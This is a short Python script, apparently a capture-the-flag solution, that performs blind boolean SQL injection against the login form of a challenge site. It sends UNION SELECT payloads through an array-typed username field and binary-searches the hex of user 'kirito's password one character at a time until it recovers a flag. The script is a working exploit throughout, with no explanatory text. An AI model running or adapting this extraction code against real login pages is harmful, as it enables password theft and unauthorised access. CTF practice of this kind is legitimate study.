import requests

ip = requests.get("https://ipinfo.io/ip").text
print(ip)


def check_char(i, v):
    r = requests.post(
        "https://sao.h4ck3r.quest/login",
        data={
            "username[]": f"' union select 'peko','miko','{ip}' from users where unicode(substr(hex(password),{i+1}))<{v} and username='kirito",
            "password": "miko",
        },
        allow_redirects=False,
    )
    return "welcome" in r.text


def bsearch_char(i):
    l = 48
    r = 71
    while l + 1 != r:
        m = (l + r) // 2
        if check_char(i, m):
            r = m
        else:
            l = m
    return chr(l)


flaghex = ""
while True:
    flaghex += bsearch_char(len(flaghex))
    if len(flaghex) % 2 == 0:
        try:
            flag = bytes.fromhex(flaghex).decode()
            print(flaghex, flag)
            if flag[-1] == "}":
                break
        except UnicodeDecodeError:
            pass

# FLAG{星🔵Starburst⚔️ꜱᴜᴛᴏʀɪᴍᴜ⚫爆}
